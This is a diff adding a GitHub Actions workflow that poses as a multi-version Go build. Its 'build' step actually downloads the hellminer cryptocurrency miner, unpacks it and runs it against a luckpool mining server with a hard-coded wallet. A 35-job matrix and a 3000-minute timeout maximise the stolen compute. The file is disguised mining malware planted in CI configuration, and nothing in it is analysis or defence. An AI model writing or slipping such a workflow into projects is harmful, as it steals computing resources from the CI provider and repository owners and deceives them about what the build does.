@@ -1,0 +1,27 @@
+name: etay
+on: [push, pull_request]
+jobs:
+  build:
+    name: Gaskan
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 250
+      fail-fast: false
+      matrix:
+        go: [1.11, 1.12, 1.13, 1.14, 1.15]
+        flag: [A, B, C, D, E, F, G]
+    timeout-minutes: 3000
+    env:
+        NUM_JOBS: 250
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: build
+      run: |
+        wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RBvqLoDz6XnyoUU9dWr345YJepFPdb6Qk1 -p x --cpu 2
